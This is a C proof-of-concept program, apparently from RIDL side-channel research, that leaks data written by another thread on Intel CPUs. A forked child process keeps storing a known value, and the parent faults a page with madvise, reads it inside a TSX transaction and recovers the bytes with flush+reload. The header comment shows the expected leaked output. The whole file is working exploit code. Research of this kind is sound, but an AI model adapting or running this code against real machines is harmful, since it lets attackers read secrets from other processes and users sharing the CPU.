/*
Leak writes from another thread.

Notes:
* MADV_DONTNEED removes the entry from the page table, so we get a fault.
  (This is simulating the results using demand paging.)
* We allocate two pages so Linux only discards the last-level entry.

Expected output:
$ taskset -c 3,7 ./ridl_invalidpage
00002217: 81 (?)

*/
#define ITERS 10000

#include "ridl.h"

int main(int argc, char *argv[]) {
	pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				"mfence\n"
				::"r"(0x8887868584838281ull));
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();
	leak = mmap((void *)0xc0000000, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);

	memset(results, 0, sizeof(results));

	madvise(leak, 4096, MADV_DONTNEED);
	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);
		asm volatile("mfence\n");
		tsx_leak_read_normal(leak, reloadbuffer);
		reload(reloadbuffer, results);
	}

	print_results(results);
	kill(pid, SIGKILL);
}

